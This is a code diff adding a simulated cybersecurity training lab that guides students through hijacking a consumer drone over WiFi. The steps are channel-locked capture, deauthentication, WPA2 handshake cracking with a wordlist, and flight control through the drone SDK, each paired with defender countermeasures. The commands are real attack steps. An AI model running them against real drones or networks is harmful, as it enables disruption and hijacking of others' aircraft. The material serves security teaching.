+            hint: `airodump-ng -c ${DRONE_CHANNEL} --bssid ${DRONE_BSSID} -w drone-capture Attacker-wlan0mon`,
+            validate: c =>
+                c.includes('airodump-ng') &&
+                c.includes('-c') && (c.includes(' 3') || c.includes('=3')) &&
+                c.includes('--bssid') && c.includes(DRONE_BSSID) &&
+                c.includes('-w') &&
+                c.includes('Attacker-wlan0mon'),
+            response: AIRODUMP_TARGETED_INITIAL + '\n' + AIRODUMP_RUNNING,
+            successMessage: 'Capture locked to CH 3, BSSID 02:00:00:00:04:00. Data frames accumulating — the controller (00:00:00:00:00:01) is sending telemetry traffic. The capture file drone-capture-01.cap is being written. We need a WPA2 4-way handshake before we can crack the key.',
+            defender: 'Channel locking is a passive technique — the drone\'s AP has no visibility into being targeted. Frequency-hopping spread spectrum (FHSS) protocols like those used in dedicated RC control links (FrSky, Crossfire) are far more resistant to targeted capture. WiFi-based drone control links were never designed for adversarial RF environments.'
+        },
+        {
+            /* Phase 4 — Deauthenticate the drone controller */
+            id: 4,
+            question: `Deauthenticate the drone controller to force a WPA2 handshake with <code>aireplay-ng -0 5 -a 02:00:00:00:04:00 -c 00:00:00:00:00:01 Attacker-wlan0mon</code>`,
+            hint: `aireplay-ng -0 5 -a ${DRONE_BSSID} -c ${CTRL_MAC} Attacker-wlan0mon`,
+            validate: c =>
+                c.includes('aireplay-ng') &&
+                (c.includes('-0') || c.includes('--deauth')) &&
+                c.includes('-a') && c.includes(DRONE_BSSID) &&
+                c.includes('-c') && c.includes(CTRL_MAC) &&
+                c.includes('Attacker-wlan0mon'),
+            response: `08:20:14  Waiting for beacon frame (BSSID: ${DRONE_BSSID}) on channel ${DRONE_CHANNEL}
+08:20:14  Sending 64 directed DeAuth (code 7). STMAC: [${CTRL_MAC}] [ 0| 0 ACKs]
+08:20:15  Sending 64 directed DeAuth (code 7). STMAC: [${CTRL_MAC}] [ 0| 0 ACKs]
+08:20:16  Sending 64 directed DeAuth (code 7). STMAC: [${CTRL_MAC}] [ 0| 0 ACKs]
+08:20:17  Sending 64 directed DeAuth (code 7). STMAC: [${CTRL_MAC}] [ 0| 0 ACKs]
+08:20:18  Sending 64 directed DeAuth (code 7). STMAC: [${CTRL_MAC}] [ 0| 0 ACKs]
+
+<span style="color:#f59e0b;">[ Drone controller disconnected — controller app shows "Connection Lost" ]</span>
+
+<span style="color:#22c55e;">[ WPA handshake: ${DRONE_BSSID} ]</span>
+<span style="color:#a855f7;">Handshake captured and written to ${CAPTURE_FILE}</span>`,
+            successMessage: 'Deauth frames forced the Tello controller to disconnect. The drone entered hover-hold mode (failsafe behavior) while the controller re-authenticated. The WPA2 4-way handshake exchange was captured during that reconnect. We now have everything needed for offline cracking.',
+            defender: 'When a consumer drone loses its WiFi controller signal, most enter hover-hold or return-to-home mode. A sophisticated attacker can weaponize deauthentication to trigger these failsafes repeatedly, disrupting legitimate operations. 802.11w Protected Management Frames would prevent deauth spoofing — but almost no consumer drones implement it.'
+        },
+        {
+            /* Phase 5 — Confirm WPA handshake was captured */
+            id: 5,
+            question: `Confirm the WPA handshake was captured with <code>aircrack-ng ${CAPTURE_FILE}</code> (no wordlist flag — just validates the capture)`,
+            hint: `aircrack-ng ${CAPTURE_FILE}`,
+            validate: c =>
+                c.includes('aircrack-ng') &&
+                c.includes(CAPTURE_FILE) &&
+                !c.includes('-w'),
+            response: `Opening ${CAPTURE_FILE}
+Read 847 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  ${DRONE_BSSID}  ${DRONE_SSID}             WPA (1 handshake)
+
+<span style="color:#22c55e;">Handshake confirmed: 1 valid WPA2 handshake found in ${CAPTURE_FILE}</span>
+<span style="color:#6b7280;">Ready to crack. Use -w <wordlist> to begin dictionary attack.</span>`,
+            successMessage: 'One valid WPA2 handshake confirmed against TELLO-ED4F82. The capture contains the EAPOL frames (messages 1-4) from the 4-way handshake. This is everything needed to run an offline dictionary attack — the actual PSK is never transmitted, but the handshake lets us test candidate passwords locally.',
+            defender: 'The WPA2 PBKDF2-HMAC-SHA1 derivation runs 4096 iterations to slow cracking. However, GPU clusters can test billions of candidate passwords per second against captured handshakes. Drone PSKs shorter than 20 random characters are practically crackable in minutes. WPA3-SAE eliminates this attack class entirely.'
+        },
+        {
+            /* Phase 6 — Crack the drone WiFi PSK */
+            id: 6,
+            question: `Crack the drone WiFi key with <code>aircrack-ng -w /usr/share/wordlists/rockyou.txt ${CAPTURE_FILE}</code>`,
+            hint: `aircrack-ng -w /usr/share/wordlists/rockyou.txt ${CAPTURE_FILE}`,
+            validate: c =>
+                c.includes('aircrack-ng') &&
+                c.includes('-w') &&
+                (c.includes('rockyou') || c.includes('wordlist')) &&
+                c.includes(CAPTURE_FILE),
+            response: `Opening ${CAPTURE_FILE}
+Read 847 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  ${DRONE_BSSID}  ${DRONE_SSID}             WPA (1 handshake)
+
+Choosing first network as target.
+
+<span style="color:#6b7280;">Opening ${CAPTURE_FILE}
+Reading packets, please wait...
+Aircrack-ng 1.7</span>
+
+                         [00:00:02] 14203/9822768 keys tested (7,101 k/s)
+
+                               Current passphrase: drone2020
+
+      Time left: 23 minutes, 1 second                             0.14%
+
+<span style="color:#6b7280;">                         [00:00:07] 51443/9822768 keys tested (7,063 k/s)
+
+                               Current passphrase: dron3ctrl!</span>
+
+                         [00:00:09] Testing: <span style="color:#c4b5d4;">drone12345</span>
+
+<span style="color:#22c55e;">
+                   [KEY FOUND! [ ${DRONE_PSK} ]</span>
+
+      Master Key     : A1 3C 7F 82 D4 19 0E B5 CC 41 88 F3 9A 55 2D 07
+                       8B 6E 14 C0 3F A9 22 77 5D BC 90 31 E4 12 66 FA
+
+      Transient Key  : 2B 9D 4A 71 C8 33 E5 0F AA 88 5C 19 30 F7 B4 22
+                       7F 1C 9B 40 D3 8E 55 A6 14 C4 02 7E 9A 88 31 1B
+                       04 3A 6C B7 21 C5 E8 F4 77 90 1D 43 AB 5C 30 E9
+                       C2 24 08 F2 D3 78 9E 11 4D A6 52 1C 88 3F 01 D5
+
+      EAPOL HMAC     : 9C 13 D4 55 C7 00 8E 3A F1 6C 21 B4 91 07 4D BB`,
+            successMessage: `KEY FOUND: drone12345 — A trivially weak password that appears in rockyou.txt within the first 0.52% of the list. Aircrack-ng tested the PBKDF2 derivation at ~7,100 keys/second. Default or short PSKs on drone WiFi APs are the single most common vulnerability in consumer UAV security assessments.`,
+            defender: 'Consumer drones ship with default or randomly-generated short PSKs printed on the airframe — trivially crackable. Security-conscious drone operators should configure PSKs of 25+ random characters, document them in an asset management system, and rotate after each engagement. Purpose-built drone security platforms (Dedrone, AeroDefense) add RF-layer monitoring independent of the WiFi stack.'
+        },
+        {
+            /* Phase 7 — Connect and launch the drone control interface */
+            id: 7,
+            question: 'Connect to the drone network and launch the Python control interface with <code>python3 control-drones.py</code>',
+            hint: 'python3 control-drones.py',
+            validate: c =>
+                c.includes('python3') &&
+                (c.includes('control-drones') || c.includes('control_drones')),
+            response: `<span style="color:#6b7280;">Importing Tello SDK... OK
+Connecting to ${DRONE_SSID} (${DRONE_BSSID})...
+Authenticating with PSK: ${DRONE_PSK}
+WPA2 association: SUCCESS</span>
+
+<span style="color:#22c55e;">Connected to drone WiFi network.</span>
+<span style="color:#6b7280;">Sending SDK initialization command... OK
+Receiving telemetry stream... OK</span>
+${DRONE_GRID}`,
+            successMessage: 'DroneCtrl connected via the compromised WiFi credential. The Python SDK speaks the Tello UDP command protocol over the drone\'s own network — the same interface the legitimate controller app uses. We now have full bidirectional command-and-control.',
+            defender: 'The Tello SDK protocol is unauthenticated at the application layer — any client on the drone WiFi network can send flight commands. There is no command signing, session token, or source IP restriction. An attacker who joins the network has identical privileges to the legitimate controller. Drone vendors must implement application-layer mutual authentication separate from the WiFi association credential.'
+        },
+        {
+            /* Phase 8 — Demonstrate flight control (post-exploitation) */
+            id: 8,
+            question: 'Demonstrate flight control by running the takeoff and flight sequence with <code>python3 control-drones.py --demo-flight</code>',
+            hint: 'python3 control-drones.py --demo-flight',
+            validate: c =>
+                c.includes('python3') &&
+                (c.includes('control-drones') || c.includes('control_drones')) &&
+                (c.includes('--demo') || c.includes('demo') || c.includes('takeoff') || c.includes('flight')),
+            response: FLIGHT_DEMO,
+            successMessage: 'Full drone compromise demonstrated — attacker achieved physical airspace control through a chain of: monitor mode -> passive scan -> channel lock -> deauth -> handshake capture -> dictionary crack -> SDK exploitation. The entire attack chain took under 10 minutes against a default-configured consumer drone.',
+            defender: 'Drone hijacking is not theoretical — it has been demonstrated against military-grade assets. Physical airspace is now an attack surface. Countermeasures: (1) WPA3-SAE to eliminate offline cracking, (2) Application-layer command signing with HMAC, (3) Geofenced RF monitoring (Dedrone/AeroDefense), (4) Return-to-home triggering on command authentication failure, (5) RF fingerprinting to detect impersonation.'
+        }
+    ];
+
+    /* ── Lab state ───────────────────────────────────────────────── */
+    const state = {
+        currentTask:      0,
+        results:          {},   // task index -> 'correct' | 'skipped'
+        attempts:         {},   // task index -> attempt count
+        monitorEnabled:   false,
+        handshakeCaptured: false,
+        keyFound:         false,
+        droneConnected:   false
+    };
+
+    /* ── Initialise LinuxTerminal and virtual filesystem ─────────── */
+    function init() {
+        LinuxTerminal.init('WIFIFORGE-09', '#terminal', {
+            user:     'operator',
+            hostname: 'skywatch-kali',
+            startDir: '/home/operator',
+            height:   '100%',
+            onCommand: handleCommand,
+            objectives: TASKS.map(t => ({
+                id:   `obj${t.id}`,
+                desc: t.question.replace(/<[^>]+>/g, '').substring(0, 52)
+            }))
+        });
+
+        /* Simulated filesystem for the drone assessment environment */
+        LinuxTerminal.addFilesystem({
+            '/home/operator': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                children: ['drone-tools', 'wordlists', 'control-drones.py', '.bashrc']
+            },
+            '/home/operator/drone-tools': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                children: ['README.md']
+            },
+            '/home/operator/drone-tools/README.md': {
+                type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                size: 512,
+                content: 'Drone Assessment Toolkit\n========================\nTools: aircrack-ng, aireplay-ng, airodump-ng, control-drones.py\nTarget: Consumer UAV WiFi access points\nScope: SkyWatch Drone Corp test facility (written authorization required)'
+            },
+            '/home/operator/wordlists': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
+                children: ['rockyou.txt', 'drone-passwords.txt']
+            },
+            '/home/operator/wordlists/rockyou.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                size: 139921497,
+                content: '123456\npassword\ndrone12345\n... (14,344,392 entries)'
+            },
+            '/home/operator/wordlists/drone-passwords.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                size: 4096,
+                content: 'drone123\ndrone12345\ndronepass\ntello123\ndji12345\nuav-secure\nflyaway!'
+            },
+            '/home/operator/control-drones.py': {
+                type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator',
+                size: 8192,
+                content: '#!/usr/bin/env python3\n# DroneCtrl — Tello SDK control interface\n# Usage: python3 control-drones.py [--demo-flight]\n\nimport socket, time\nTELLO_IP = "192.168.10.1"\nTELLO_PORT = 8889\n...'
+            },
+            '/usr/share/wordlists': {
+                type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
+                children: ['rockyou.txt']
+            },
+            '/usr/share/wordlists/rockyou.txt': {
+                type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root',
+                size: 139921497,
+                content: '123456\npassword\ndrone12345\n... (14,344,392 entries)'
+            }
+        });
+
+        buildObjList();
+        document.getElementById('totalTasks').textContent = TASKS.length;
+        showTask(0);
+
+        /* Welcome message */
+        LinuxTerminal.print(`<span style="color:#a855f7;">[ WifiForge Lab 09: Drone Hacking via WiFi ]</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Target environment: SkyWatch Drone Corp test facility</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Attacker interface: Attacker-wlan0 (Atheros AR9271, injection capable)</span>`);
+        LinuxTerminal.print(`<span style="color:#6b7280;">Type <span style="color:#c084fc;">help</span> for commands or <span style="color:#c084fc;">objectives</span> to list all tasks.\n</span>`);
+    }
+
+    /* ── Build objectives list in sidebar ────────────────────────── */
+    function buildObjList() {
+        document.getElementById('objList').innerHTML = TASKS.map((t, i) => `
+            <li class="obj-item${i === 0 ? ' active' : ''}" data-task="${i}" id="obj-item-${i}">
+                <div class="obj-check" id="obj-check-${i}">${i + 1}</div>
+                <span>${t.question.replace(/<[^>]+>/g, '').substring(0, 55)}${t.question.replace(/<[^>]+>/g, '').length > 55 ? '...' : ''}</span>
+            </li>`).join('');
+    }
+
+    /* ── Display the current task in the prompt strip ────────────── */
+    function showTask(i) {
+        const t = TASKS[i];
+        state.currentTask = i;
+        state.attempts[i] = state.attempts[i] || 0;
+
+        document.getElementById('taskNumber').textContent = i + 1;
+        document.getElementById('taskNumber').className = 'task-number';
+        document.getElementById('currentTaskNum').textContent = i + 1;
+        document.getElementById('taskQuestion').innerHTML = t.question;
+        document.getElementById('taskHint').textContent = t.hint;
+        document.getElementById('taskHint').classList.remove('show');
+        document.getElementById('feedbackMessage').textContent = 'Enter your command...';
+        document.getElementById('feedbackMessage').className = 'feedback-message';
+        document.getElementById('skipBtn').disabled = false;
+        document.getElementById('hintBtn').disabled = false;
+
+        /* Highlight active item in sidebar */
+        document.querySelectorAll('.obj-item').forEach((el, j) => {
+            el.classList.remove('active');
+            if (j === i && !state.results[j]) el.classList.add('active');
+        });
+
+        LinuxTerminal.print(`\n<span style="color:#9333ea;">--- Objective ${i + 1} of ${TASKS.length} ---</span>`);
+    }
+
+    /* ── Handle all terminal input ───────────────────────────────── */
+    function handleCommand(cmdLine, output, cmd, args) {
+        const c = cmdLine.trim();
+        const t = TASKS[state.currentTask];
+
+        state.attempts[state.currentTask] = (state.attempts[state.currentTask] || 0) + 1;
+
+        /* Built-in passthrough commands — informational only, no penalty */
+        const passthroughs = ['clear', 'help', 'ls', 'cat', 'cd', 'pwd', 'whoami', 'uname', 'man', 'which'];
+        if (passthroughs.includes(cmd)) return;
+
+        /* objectives — list all tasks and their status */
+        if (cmd === 'objectives') {
+            LinuxTerminal.print(`<span style="color:#a855f7;">Objectives:</span>`);
+            TASKS.forEach((task, i) => {
+                const status = state.results[i] === 'correct' ? '<span style="color:#22c55e;">[DONE]</span>' :
+                               state.results[i] === 'skipped' ? '<span style="color:#f59e0b;">[SKIP]</span>' :
+                               i === state.currentTask ? '<span style="color:#9333ea;">[CURR]</span>' :
+                               '<span style="color:#374151;">[ -- ]</span>';
+                LinuxTerminal.print(`  ${status} ${i + 1}. ${task.question.replace(/<[^>]+>/g, '').substring(0, 60)}`);
+            });
+            return;
+        }
+
+        /* ifconfig — informational passthrough (useful context for students) */
+        if (cmd === 'ifconfig') {
+            LinuxTerminal.print(
+`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.50.21  netmask 255.255.255.0  broadcast 10.10.50.255
+        ether 08:00:27:1a:2b:3c  txqueuelen 1000  (Ethernet)
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+
+Attacker-wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
+        ether de:ad:be:ef:00:09  txqueuelen 1000  (Ethernet)`
+            );
+            return;
+        }
+
+        /* iwconfig — informational passthrough (monitor state awareness) */
+        if (cmd === 'iwconfig') {
+            if (state.monitorEnabled) {
+                LinuxTerminal.print(
+`Attacker-wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.422 GHz  Tx-Power=30 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:off
+
+lo        no wireless extensions.
+eth0      no wireless extensions.`
+                );
+            } else {
+                LinuxTerminal.print(
+`Attacker-wlan0  IEEE 802.11  ESSID:off/any
+          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+
+lo        no wireless extensions.
+eth0      no wireless extensions.`
+                );
+            }
+            return;
+        }
+
+        /* aireplay-ng without specifying deauth — guide the student */
+        if (cmd === 'aireplay-ng' && !c.includes('-0') && !c.includes('--deauth')) {
+            LinuxTerminal.print('<span style="color:#f59e0b;">aireplay-ng: specify attack mode. For deauthentication use -0. Example: aireplay-ng -0 5 -a &lt;BSSID&gt; -c &lt;CLIENT&gt; Attacker-wlan0mon</span>');
+            return;
+        }
+
+        /* airodump-ng without monitor mode enabled — contextual error */
+        if (c.includes('airodump-ng') && !state.monitorEnabled && !TASKS[state.currentTask].validate(c)) {
+            LinuxTerminal.print('<span style="color:#ef4444;">Attacker-wlan0 is in Managed mode. You must enable monitor mode first with: airmon-ng start Attacker-wlan0</span>');
+            return;
+        }
+
+        /* aircrack-ng without a capture file yet — contextual error */
+        if (cmd === 'aircrack-ng' && !state.handshakeCaptured && !c.includes(CAPTURE_FILE)) {
+            LinuxTerminal.print(`<span style="color:#ef4444;">No capture file available yet. Complete objectives 3 and 4 first to capture the WPA2 handshake.</span>`);
+            return;
+        }
+
+        /* python3 control script without the PSK cracked — gate the step */
+        if (cmd === 'python3' && c.includes('control-drones') && !state.keyFound) {
+            LinuxTerminal.print('<span style="color:#ef4444;">Connection refused: authentication failed. Crack the drone PSK first (objective 6), then connect with the recovered credential.</span>');
+            return;
+        }
+
+        /* Check the command against the current task validator */
+        if (t.validate(c)) {
+            /* Print realistic tool output for the completed step */
+            LinuxTerminal.print(`<span style="color:#9ca3af;">${t.response}</span>`);
+
+            /* Track game state transitions */
+            if (state.currentTask === 0) state.monitorEnabled   = true;   // airmon-ng start
+            if (state.currentTask === 3) state.handshakeCaptured = true;  // deauth + capture
+            if (state.currentTask === 5) state.keyFound          = true;  // aircrack-ng key found
+            if (state.currentTask === 6) state.droneConnected    = true;  // python3 control script
+
+            /* After handshake captured, add the capture file to the virtual filesystem */
+            if (state.currentTask === 3) {
+                LinuxTerminal.addFilesystem({
+                    [`/home/operator/${CAPTURE_FILE}`]: {
+                        type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator',
+                        size: 24576,
+                        content: `[WPA2 4-way handshake capture]\nBSSID: ${DRONE_BSSID}\nESSID: ${DRONE_SSID}\nCH: ${DRONE_CHANNEL}`
+                    }
+                });
+            }
+
+            /* Print educational success message and defender perspective */
+            LinuxTerminal.print(`\n<span style="color:#a855f7;">${t.successMessage}</span>`);
+            LinuxTerminal.print(`<span style="color:#3b82f6;">[DEFENDER] ${t.defender}</span>`);
+
+            /* Notify LinuxTerminal HUD that this objective is complete */
+            LinuxTerminal.completeObjective(`obj${t.id}`);
+
+            /* Update UI state */
+            document.getElementById('feedbackMessage').textContent = t.successMessage.substring(0, 72) + '...';
+            document.getElementById('feedbackMessage').className = 'feedback-message success';
+            state.results[state.currentTask] = 'correct';
+            markObjItem(state.currentTask, 'completed');
+            document.getElementById('taskNumber').classList.add('completed');
+            document.getElementById('skipBtn').disabled = true;
+            document.getElementById('hintBtn').disabled = true;
+
+            /* Reveal defender insight in sidebar */
+            document.getElementById('defenderBox').classList.add('show');
+            document.getElementById('defenderText').textContent = t.defender;
+
+            updateProgress();
+            setTimeout(() => advanceTask(), 2400);
+
+        } else if (c !== '') {
+            /* Wrong command — provide contextual error guidance */
+            let errMsg = '<span class="lt-error">Command not recognised for this objective. Check syntax and flags.</span>';
+
+            if (state.currentTask === 0 && c.includes('airmon-ng') && !c.includes('Attacker-wlan0')) {
+                errMsg = '<span style="color:#ef4444;">Wrong interface. The attacker adapter is Attacker-wlan0, not wlan0. Use: airmon-ng start Attacker-wlan0</span>';
+            } else if (state.currentTask === 1 && c.includes('airodump-ng') && !c.includes('Attacker-wlan0mon')) {
+                errMsg = '<span style="color:#ef4444;">Specify the monitor interface: airodump-ng Attacker-wlan0mon</span>';
+            } else if (state.currentTask === 2 && !c.includes(`-c`) && !c.includes('--bssid')) {
+                errMsg = '<span style="color:#ef4444;">You need to lock onto a specific channel and BSSID. Include -c 3 --bssid 02:00:00:00:04:00 and -w for the output file.</span>';
+            } else if (state.currentTask === 3 && c.includes('aireplay-ng') && !c.includes(CTRL_MAC)) {
+                errMsg = `<span style="color:#ef4444;">Target the drone controller client with -c ${CTRL_MAC} (the drone-controller station from airodump output).</span>`;
+            } else if (state.currentTask === 4 && c.includes('aircrack-ng') && c.includes('-w')) {
+                errMsg = `<span style="color:#ef4444;">Objective 5 just needs confirmation — run aircrack-ng without a -w flag to validate the capture file first: aircrack-ng ${CAPTURE_FILE}</span>`;
+            }
+
+            LinuxTerminal.print(errMsg);
+
+            /* Auto-reveal hint after 3 failed attempts (no score deduction for auto-hint) */
+            if (state.attempts[state.currentTask] >= 3) {
+                document.getElementById('taskHint').classList.add('show');
+            }
+        }
+    }
+
+    /* ── Show hint on demand — costs 5 points ────────────────────── */
+    function showHint() {
+        if (document.getElementById('hintBtn').disabled) return;
+        score.hints += 5;
+        document.getElementById('taskHint').classList.add('show');
+        document.getElementById('hintBtn').disabled = true;
+        updateScoreDisplay();
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[HINT -5 pts] ${TASKS[state.currentTask].hint}</span>`);
+    }
+
+    /* ── Skip current task ───────────────────────────────────────── */
+    function skipTask() {
+        if (document.getElementById('skipBtn').disabled) return;
+        state.results[state.currentTask] = 'skipped';
+        markObjItem(state.currentTask, 'skipped');
+        document.getElementById('taskNumber').classList.add('skipped');
+        document.getElementById('skipBtn').disabled = true;
+        document.getElementById('hintBtn').disabled = true;
+        document.getElementById('feedbackMessage').innerHTML =
+            `<strong>Skipped.</strong> Answer: <code style="background:rgba(147,51,234,0.2);padding:1px 6px;border-radius:4px;color:#c084fc;">${TASKS[state.currentTask].hint}</code>`;
+        LinuxTerminal.print(`<span style="color:#f59e0b;">[SKIPPED] Answer: ${TASKS[state.currentTask].hint}</span>`);
+        updateProgress();
+        setTimeout(() => advanceTask(), 900);
+    }
+
+    /* ── Advance to next task or trigger completion ───────────────── */
+    function advanceTask() {
+        if (state.currentTask >= TASKS.length - 1) {
+            showResults();
+            return;
+        }
+        showTask(state.currentTask + 1);
+    }
+
+    /* ── Update sidebar objective item styling ────────────────────── */
+    function markObjItem(i, status) {
+        const el = document.getElementById(`obj-item-${i}`);
+        const ch = document.getElementById(`obj-check-${i}`);
+        if (!el || !ch) return;
+        el.classList.remove('active', 'completed', 'skipped');
+        el.classList.add(status);
+        ch.innerHTML = status === 'completed' ? '&#10003;' : '&#8212;';
+    }
+
+    /* ── Update progress bar and score displays ───────────────────── */
+    function updateProgress() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const total     = Object.keys(state.results).length;
+        const pct       = Math.round((total / TASKS.length) * 100);
+
+        document.getElementById('progressFill').style.width = pct + '%';
+        document.getElementById('completedCount').textContent = completed;
+        document.getElementById('progressPct').textContent = pct + '%';
+
+        updateScoreDisplay();
+    }
+
+    function updateScoreDisplay() {
+        const current = Math.max(0, score.base - score.hints);
+        document.getElementById('scoreFinal').textContent = current;
+        document.getElementById('headerScore').textContent = current;
+        document.getElementById('scoreHintDeduct').textContent = `-${score.hints} pts`;
+    }
+
+    /* ── Show completion modal and register ModuleProgress ──────────
+       Called when all 8 objectives have been completed or skipped.    */
+    function showResults() {
+        const completed = Object.values(state.results).filter(r => r === 'correct').length;
+        const skipped   = Object.values(state.results).filter(r => r === 'skipped').length;
+        const finalPts  = Math.max(0, score.base - score.hints);
+
+        document.getElementById('modalCompleted').textContent = completed;
+        document.getElementById('modalSkipped').textContent   = skipped;
+        document.getElementById('modalScore').textContent     = finalPts;
+
+        const modal = document.getElementById('modalContent');
+        modal.classList.remove('perfect');
+
+        if (completed === TASKS.length) {
+            modal.classList.add('perfect');
+            document.getElementById('modalIcon').innerHTML = '&#128293;';
+            document.getElementById('modalTitle').textContent = 'Full Compromise!';
+            document.getElementById('modalMessage').textContent =
+                'Complete drone compromise chain executed: monitor mode through flight control. Perfect run.';
+        } else {
+            document.getElementById('modalIcon').innerHTML = '&#128640;';
+            document.getElementById('modalTitle').textContent = 'Lab Complete';
+            document.getElementById('modalMessage').textContent =
+                `${completed}/${TASKS.length} objectives completed. Review skipped steps to master the full drone attack chain.`;
+        }
+
+        document.getElementById('resultsModal').classList.add('show');
+
+        /* Register lab completion with the platform progress system */
+        try {
+            if (typeof ModuleProgress !== 'undefined') {
+                ModuleProgress.complete('dark-arts', 'wifi-lab-09', {
+                    returnUrl: '../index.html'
+                });
+            }
+        } catch (e) { /* non-fatal: platform may not be present in isolated testing */ }
+
+        /* AchievementManager hooks for special conditions */
+        try {
+            if (typeof AchievementManager !== 'undefined') {
+                if (completed === TASKS.length && score.hints === 0) {
+                    AchievementManager.unlock('drone_ace');
+                }
+                if (completed >= 6) {
+                    AchievementManager.unlock('signal_interceptor');
+                }
+                if (state.droneConnected) {
+                    AchievementManager.unlock('ghost_pilot');
+                }
+            }
+        } catch (e) { /* non-fatal */ }
+    }
+
+    /* ── Restart lab from scratch ─────────────────────────────────── */
+    function restartLab() {
+        document.getElementById('resultsModal').classList.remove('show');
+        document.getElementById('defenderBox').classList.remove('show');
+        score.hints           = 0;
+        state.currentTask     = 0;
+        state.results         = {};
+        state.attempts        = {};
+        state.monitorEnabled  = false;
+        state.handshakeCaptured = false;
+        state.keyFound        = false;
+        state.droneConnected  = false;
+        updateScoreDisplay();
+        LinuxTerminal.destroy();
+        init();
+    }
+
+    /* ── Boot ──────────────────────────────────────────────────────── */
+    document.addEventListener('DOMContentLoaded', init);
+    </script>
+
+    <!-- Progress, tracking, and flux components load after game logic -->
+    <script src="../../../../components/FluxCapacitor.js"></script>
+
+</body>
+</html>
